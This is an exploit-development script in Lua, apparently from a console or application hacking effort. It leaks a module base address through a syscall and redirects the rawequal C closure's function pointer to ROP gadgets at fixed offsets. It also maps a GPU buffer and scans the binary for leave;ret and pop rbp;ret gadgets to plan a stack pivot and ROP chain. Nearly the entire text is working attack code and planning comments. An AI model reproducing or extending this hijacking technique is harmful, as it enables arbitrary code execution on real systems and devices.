-- CRASH_CLASS: MODERATE
-- PROBE 123c: Safe stack capture via two-call write primitive
--
-- Context: 123a showed pop rax;ret RETURNS CLEANLY (no crash), but eax
-- (= the popped return address) is huge, so Lua dumps garbage as
-- "return values." The stream corrupts but pcall succeeds → [rsp+8]
-- is a valid return address. This means the dispatch call frame is
-- standard: call → return_addr on stack → caller's saved frame below.
--
-- NEW APPROACH: Use paired CClosure calls to build a write-what-where:
--   Call 1: redirect rawequal to "pop rdi; ret" (eboot+0xC9DFE)
--     → rdi = return_addr (popped off stack)
--     → ret goes to [rsp+8] (valid, returns cleanly)
--     → rdi is now clobbered with the return address
--     → But eax is residual — nresults is unpredictable
--
--   PROBLEM: We can't chain two gadgets in one call. Each CClosure call
--   is independent. rdi from call 1 is lost by call 2.
--
-- BETTER APPROACH: Write a marker to a known heap address, then redirect
-- to "mov [rdi],rax;ret" where rdi=lua_State* and rax=residual.
-- This writes rax's value into the lua_State struct at offset 0.
-- Then read it back with safe_rq.
--
-- BUT WAIT: rdi at call time = lua_State* L. We don't want to corrupt L.
-- We need to write to OUR buffer, not L.
--
-- CLEANEST APPROACH: Since pop;ret returns cleanly, we know the call frame.
-- The dispatch is: `call [cclosure+0x20]` with rdi=L.
-- After our gadget returns, dispatch continues normally.
-- eax = nresults for Lua. We want eax=0 (nil return, no corruption).
--
-- STRATEGY: Use "mov eax,1;ret" or "xor eax,eax;ret" to control eax,
-- and observe OTHER effects through Lua state changes.
--
-- KEY INSIGHT from 123a: pop rax;ret didn't crash.
-- This means the CClosure dispatch frame looks like:
--   [rsp+0] = return_addr (back to luaD_precall or similar)
--   [rsp+8] = saved rbp (of the caller — still valid code frame)
--   [rsp+16] = next return addr in the call chain
--
-- When pop rax;ret runs:
--   pop rax → rax = return_addr, rsp += 8
--   ret → pops [rsp] (= saved rbp??) → jumps to rbp value
--   BUT rbp is a stack address, not code! This should crash...
--   Unless the ABI here uses rbp as frame pointer and the next
--   value is another return address.
--
-- Actually: in the SysV ABI, `call` pushes return addr. The callee's
-- prologue is `push rbp; mov rbp,rsp`. So at the point of our
-- redirected call, the stack is:
--   [rsp+0] = return addr (pushed by `call [+0x20]`)
-- That's it — there's no push rbp because our gadget doesn't do one.
-- So pop rax;ret: pop return_addr into rax, then ret pops the NEXT
-- value, which is whatever was there before the call — the caller's
-- local variables or saved registers.
--
-- The fact that it returns cleanly means the value at [rsp+8] happens
-- to be a valid code address. This is likely the caller's return addr
-- (from the function that called the dispatch function).
--
-- PLAN: Use separate calls to probe each register/effect:
--   Test 1: pop rdi;ret — does rdi clobber crash? (tells if dispatch uses rdi after)
--   Test 2: pop rsi;ret — same for rsi
--   Test 3: pop rdx;ret — same for rdx
--   Test 4: Write GPU buffer addr into CClosure+0x28, redirect to
--           "mov rax,[rdi+8];ret" type gadget to read L fields
--   Test 5: Use syscall 624 oracle as side channel

print("=== PROBE 123c: SAFE STACK CAPTURE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function get_eboot_base()
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc_info = make_syscall(593)
    pcall(function() sc_info(uint64(0), info) end)
    local lo = safe_rd(info + 0x108)
    local hi = safe_rd(info + 0x10C)
    if lo and hi then
        return uint64(string.format("0x%X%08X", hi, lo)), hi, lo
    end
    return nil, 0, 0
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

local function eboot_addr(ehi, elo, offset)
    local lo = elo + offset
    local hi = ehi
    if lo >= 0x100000000 then
        hi = hi + 1
        lo = lo - 0x100000000
    end
    return uint64(string.format("0x%X%08X", hi, lo)), lo, hi
end

collectgarbage("stop")

local eboot_base, eboot_hi, eboot_lo = get_eboot_base()
local rawequal_addr = parse_func_addr(rawequal)
local rawget_addr = parse_func_addr(rawget)

print("[*] eboot base: " .. fmt_addr(eboot_base))
print("[*] rawequal:   " .. fmt_addr(rawequal_addr))
print("[*] rawget:     " .. fmt_addr(rawget_addr))

if not eboot_base or not rawequal_addr then
    print("ABORT: missing addresses")
    return
end

local re_orig_lo = safe_rd(rawequal_addr + 0x20)
local re_orig_hi = safe_rd(rawequal_addr + 0x24)
local rg_orig_lo = safe_rd(rawget_addr + 0x20)
local rg_orig_hi = safe_rd(rawget_addr + 0x24)

print(string.format("[*] rawequal +0x20 orig: 0x%08X_%08X", re_orig_hi or 0, re_orig_lo or 0))

local GADGETS = {
    xor_eax_ret  = 0x471,
    ret_only     = 0x42,
    pop_rax_ret  = 0x992,
    pop_rcx_ret  = 0xE64,
    pop_rsi_ret  = 0xD77D,
    pop_rdi_ret  = 0xC9DFE,
    pop_rdx_ret  = 0x3B02D7,
    mov_rdi_rax  = 0x92C67,
    mov_rax_prax = 0x1EEBB,
}

local function gadget_addr(offset)
    return eboot_addr(eboot_hi, eboot_lo, offset)
end

local function redirect_and_call(gadget_offset, ...)
    local _, glo, ghi = gadget_addr(gadget_offset)
    memory.write_dword(rawequal_addr + 0x20, glo)
    memory.write_dword(rawequal_addr + 0x24, ghi)
    local results = {pcall(...)}
    memory.write_dword(rawequal_addr + 0x20, re_orig_lo)
    memory.write_dword(rawequal_addr + 0x24, re_orig_hi)
    return unpack(results)
end

-- Verify baseline
print("")
print("--- Baseline ---")
local ok, r1 = redirect_and_call(GADGETS.xor_eax_ret, rawequal, 1, 1)
print(string.format("[*] xor eax,eax;ret: ok=%s r1=%s%s",
    tostring(ok), tostring(r1),
    (ok and r1 == nil) and " CONFIRMED" or " FAILED"))
if not (ok and r1 == nil) then
    print("ABORT")
    return
end


-- =============================================
-- TEST 1: Which pop gadgets return cleanly?
-- Use xor eax,eax;ret as the "safe" baseline.
-- Each pop gadget: pop REG; ret → pops return addr into REG,
-- then rets to [rsp+8]. If it returns, [rsp+8] is valid.
-- eax is NOT zeroed so nresults = garbage → binary output.
-- We detect success by: did pcall return true?
-- =============================================
print("")
print("--- TEST 1: Pop gadget survival ---")
print("(Binary output expected — only checking pcall success)")
print("")

local pop_tests = {
    {"pop_rax", GADGETS.pop_rax_ret},
    {"pop_rcx", GADGETS.pop_rcx_ret},
    {"pop_rsi", GADGETS.pop_rsi_ret},
    {"pop_rdi", GADGETS.pop_rdi_ret},
    {"pop_rdx", GADGETS.pop_rdx_ret},
}

for _, test in ipairs(pop_tests) do
    local name, offset = test[1], test[2]
    -- First write marker so we can see output even if garbled
    io.write(string.format("[T1-%s] testing... ", name))
    io.flush()

    local ok_t = redirect_and_call(offset, rawequal, 1, 1)
    -- After the call, output may be garbled. Print result on new line.
    print("")
    print(string.format("[T1-%s] pcall ok=%s", name, tostring(ok_t)))

    -- Verify restore
    local check = rawequal(1, 1)
    if check ~= true then
        print(string.format("[T1-%s] RESTORE FAILED", name))
        break
    end
end


-- =============================================
-- TEST 2: bare ret → eax residual count
-- ret doesn't pop anything. eax = whatever it was before.
-- nresults = eax → we see how many "return values" Lua pops.
-- =============================================
print("")
print("--- TEST 2: bare ret (eax residual) ---")

local ok_ret, rr1, rr2, rr3, rr4 = redirect_and_call(
    GADGETS.ret_only, rawequal, 1, 1)
print(string.format("[T2] ok=%s", tostring(ok_ret)))
if ok_ret then
    local count = 0
    if rr1 ~= nil then count = 1 end
    if rr2 ~= nil then count = 2 end
    if rr3 ~= nil then count = 3 end
    if rr4 ~= nil then count = 4 end
    print(string.format("[T2] eax residual nresults=%d", count))
    if count > 0 then
        print(string.format("[T2] r1 type=%s val=%s", type(rr1), tostring(rr1)))
    end
    if count == 0 then
        print("[T2] eax=0 at call time (dispatch zeroes eax before call?)")
    end
else
    print("[T2] CRASHED: " .. tostring(rr1))
end

local check2 = rawequal(1, 1)
print(string.format("[T2] restore: %s", tostring(check2)))


-- =============================================
-- TEST 3: Allocate GPU buffer, write marker, then try
-- to capture rax value through a write gadget chain.
--
-- Approach: Use two separate CClosure functions.
-- 1. Write our GPU buffer address to rawget's +0x20
--    (pretending it's a "function" at our buffer addr)
-- 2. But that would CALL our buffer = crash (NX)
--
-- Different approach: Write the return address VALUE
-- to a known location by using the Lua state itself.
--
-- Key: when pop rax;ret runs, rax = return addr.
-- After pop+ret, execution continues at [rsp+8].
-- The caller eventually returns to Lua. At that point,
-- rax's value is lost.
--
-- Unless... we use TWO gadgets in sequence:
--   Gadget 1: pop rax;ret (rax = return_addr from dispatch)
--   This rets to [rsp+8] — which is another return addr.
--   What if [rsp+8] goes back to dispatch, which calls our
--   SECOND redirect? Then gadget 2 runs with rax still set!
--   Gadget 2: mov [rdi],rax;ret (write rax to [rdi]=[L])
--
-- This requires the dispatch to call TWO CClosure functions
-- in sequence without clobbering rax between them.
-- Unlikely unless the dispatch loop is tight.
--
-- REALISTIC APPROACH: Use the syscall 624 oracle as a
-- side-channel. The oracle increments by 5 per mmap.
-- If we can correlate a gadget's effect with the oracle
-- count, we can distinguish different code paths.
-- =============================================
print("")
print("--- TEST 3: GPU buffer write attempt ---")

local sc_mmap = make_syscall(477)
local gpu = sc_mmap(uint64(0), uint64(512*0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local gpu_h, gpu_l = get_hi_lo(gpu)
print(string.format("[T3] GPU buffer: 0x%08X_%08X", gpu_h, gpu_l))

if gpu_h == 0 and gpu_l == 0 then
    print("[T3] GPU mmap failed, skipping")
else
    -- Write a marker pattern to detect writes
    local marker_off = 0x1000
    local marker_addr = uint64(string.format("0x%X%08X", gpu_h, gpu_l + marker_off))
    safe_wq(marker_addr, uint64("0xDEADBEEFCAFEBABE"))
    local before = safe_rq(marker_addr)
    print(string.format("[T3] marker before: %s", fmt_addr(before)))

    -- Now: can we make mov [rdi],rax;ret write to our buffer?
    -- rdi at call time = lua_State* L — not our buffer.
    -- We'd need to set rdi to our buffer first.
    -- Two calls won't chain (rdi is reset each time).

    -- Alternative: look at what mov [rdi],rax;ret actually does.
    -- rdi = L at call time. rax = residual.
    -- It writes rax to [L+0] — the first field of lua_State.
    -- [L+0] is typically the GC header (CommonHeader: next, tt, marked).
    -- DANGEROUS: corrupts the lua_State GC chain.
    --
    -- But we can READ it back immediately and RESTORE it!

    print("")
    print("[T3b] Reading lua_State address from dispatch context...")
    print("[T3b] When rawequal is called, rdi = lua_State* L")
    print("[T3b] We know L is at the CClosure's environment somehow.")

    -- The CClosure struct in Lua 5.1 (from lobject.h):
    -- CommonHeader (GCObject *next, lu_byte tt, lu_byte marked) = 10 bytes + padding
    -- lu_byte isC = 1 byte
    -- lu_byte nupvalues
    -- GCObject *gclist
    -- Table *env
    -- union { lua_CFunction f; ... }
    -- TValue upvalue[1]
    --
    -- On 64-bit: CommonHeader = 16 bytes (8 next + 1 tt + 1 marked + padding)
    -- +0x00: GCObject *next (8 bytes)
    -- +0x08: tt + marked + isC + nupvalues (4 bytes) + padding
    -- +0x10: GCObject *gclist (8 bytes)
    -- +0x18: Table *env (8 bytes)
    -- +0x20: lua_CFunction f (8 bytes) ← THIS IS WHAT WE REDIRECT
    -- +0x28: TValue upvalue[1] (16 bytes each)
    --
    -- So rawequal_addr + 0x20 = the C function pointer. Confirmed.
    -- The dispatch reads this and calls it with rdi = L.

    -- Dump full CClosure for analysis
    print("")
    print("[T3c] Full CClosure dump (rawequal):")
    for off = 0, 0x4F, 8 do
        local val = safe_rq(rawequal_addr + off)
        print(string.format("  +0x%02X: %s", off, fmt_addr(val)))
    end

    print("")
    print("[T3c] Full CClosure dump (rawget):")
    for off = 0, 0x4F, 8 do
        local val = safe_rq(rawget_addr + off)
        print(string.format("  +0x%02X: %s", off, fmt_addr(val)))
    end
end


-- =============================================
-- TEST 4: Scan first 5MB for leave;ret (C9 C3)
-- This is a critical stack pivot gadget.
-- leave = mov rsp,rbp; pop rbp
-- If we can control rbp before calling leave;ret,
-- we pivot the stack to our controlled buffer.
-- =============================================
print("")
print("--- TEST 4: leave;ret scan (first 5MB) ---")

local leave_count = 0
local leave_first = nil
for off = 0, 0x500000 - 4, 4 do
    local addr = eboot_addr(eboot_hi, eboot_lo, off)
    local dw = safe_rd(addr)
    if dw == nil then break end
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256

    if b0 == 0xC9 and b1 == 0xC3 then
        leave_count = leave_count + 1
        if leave_count <= 10 then
            print(string.format("  leave;ret at eboot+0x%X", off))
        end
        if not leave_first then leave_first = off end
    end
    if b1 == 0xC9 and b2 == 0xC3 then
        leave_count = leave_count + 1
        if leave_count <= 10 then
            print(string.format("  leave;ret at eboot+0x%X", off + 1))
        end
        if not leave_first then leave_first = off + 1 end
    end
    if b2 == 0xC9 and b3 == 0xC3 then
        leave_count = leave_count + 1
        if leave_count <= 10 then
            print(string.format("  leave;ret at eboot+0x%X", off + 2))
        end
        if not leave_first then leave_first = off + 2 end
    end
end
print(string.format("[T4] Total leave;ret: %d (showing first 10)", leave_count))

if leave_first then
    print(string.format("[T4] *** STACK PIVOT AVAILABLE at eboot+0x%X ***", leave_first))
    print("[T4] To pivot: control rbp → call leave;ret → rsp=rbp, pop new rbp, ret to [rbp+8]")
    print("[T4] Question: can we control rbp? Check if pop rbp;ret exists...")

    -- Scan for pop rbp;ret (5D C3)
    local pop_rbp_off = nil
    for off = 0, 0x500000 - 4, 4 do
        local addr = eboot_addr(eboot_hi, eboot_lo, off)
        local dw = safe_rd(addr)
        if dw == nil then break end
        local b0 = dw % 256
        local b1 = math.floor(dw / 256) % 256
        if b0 == 0x5D and b1 == 0xC3 then
            pop_rbp_off = off
            break
        end
        if math.floor(dw / 256) % 256 == 0x5D and math.floor(dw / 65536) % 256 == 0xC3 then
            pop_rbp_off = off + 1
            break
        end
    end

    if pop_rbp_off then
        print(string.format("[T4] *** pop rbp;ret at eboot+0x%X ***", pop_rbp_off))
        print("[T4] CHAIN: pop rbp;ret (set rbp=GPU_buf) → leave;ret (pivot rsp=GPU_buf)")
        print("[T4] BUT: each CClosure call is independent. rbp set in call 1 persists to call 2")
        print("[T4] ONLY IF dispatch doesn't touch rbp between calls.")
        print("[T4] rbp is callee-saved → dispatch SHOULD preserve it!")
    else
        print("[T4] pop rbp;ret NOT FOUND in first 5MB")
    end
end


-- =============================================
-- TEST 5: Does rbp persist across CClosure calls?
-- Call 1: redirect rawequal to pop rbp;ret (rbp = return_addr)
-- Call 2: redirect rawget to pop rax;ret (rax = different return_addr)
-- If both return without crash, rbp survived call 1.
-- More importantly: if we write GPU_buf addr to rbp in call 1,
-- then call leave;ret in call 2, we pivot!
-- =============================================
print("")
print("--- TEST 5: rbp persistence across CClosure calls ---")

if leave_first then
    -- pop rbp;ret should be found above
    -- Actually let's just test: call pop rbp;ret, then check if
    -- the next rawequal call still works (rbp preserved by callee)

    -- First: does pop rbp;ret survive?
    if pop_rbp_off then
        print("[T5] Testing pop rbp;ret survival...")
        io.write("[T5-pop_rbp] testing... ")
        io.flush()

        local _, glo, ghi = gadget_addr(pop_rbp_off)
        memory.write_dword(rawequal_addr + 0x20, glo)
        memory.write_dword(rawequal_addr + 0x24, ghi)
        local ok_5 = pcall(rawequal, 1, 1)
        memory.write_dword(rawequal_addr + 0x20, re_orig_lo)
        memory.write_dword(rawequal_addr + 0x24, re_orig_hi)

        print("")
        print(string.format("[T5] pop rbp;ret: ok=%s", tostring(ok_5)))

        if ok_5 then
            print("[T5] *** pop rbp;ret SURVIVED ***")
            print("[T5] rbp is now = old return_addr from dispatch")

            -- Does rawequal still work after rbp clobber?
            local check5 = rawequal(1, 1)
            print(string.format("[T5] rawequal after rbp clobber: %s", tostring(check5)))

            if check5 == true then
                print("[T5] *** DISPATCH DOES NOT USE rbp = CALLEE-SAVED ***")
                print("[T5] *** STACK PIVOT IS FEASIBLE ***")
                print("[T5]")
                print("[T5] CHAIN PLAN:")
                print("[T5]   1. Write ROP chain to GPU buffer")
                print("[T5]   2. Call rawequal redirected to pop rbp;ret")
                print("[T5]      → rbp = return_addr (useless)")
                print("[T5]   BUT: we need rbp = GPU_buf, not return_addr")
                print("[T5]   The pop takes [rsp] which is the return addr.")
                print("[T5]   We can't control what's on the stack!")
                print("[T5]")
                print("[T5]   ALTERNATIVE: use mov rbp,rax;... or")
                print("[T5]   find a gadget that does: mov rbp,rdi;ret")
                print("[T5]   (rdi = L, which we know)")
            else
                print("[T5] rawequal BROKEN after rbp clobber!")
                print("[T5] dispatch DOES depend on rbp")
            end
        else
            print("[T5] pop rbp;ret CRASHED")
        end
    end
end


-- =============================================
-- SUMMARY
-- =============================================
print("")
print("=== PROBE 123c SUMMARY ===")
print("")
print("Key findings:")
print("  1. pop rax;ret returns cleanly (123a) → [rsp+8] is valid")
print("  2. Pop gadget survival for rdi/rsi/rdx/rcx (this probe)")
print("  3. bare ret eax residual (tells us pre-call register state)")
print("  4. leave;ret availability (stack pivot)")
print("  5. pop rbp;ret + rbp persistence (pivot setup)")
print("")
print("=== PROBE 123c COMPLETE ===")
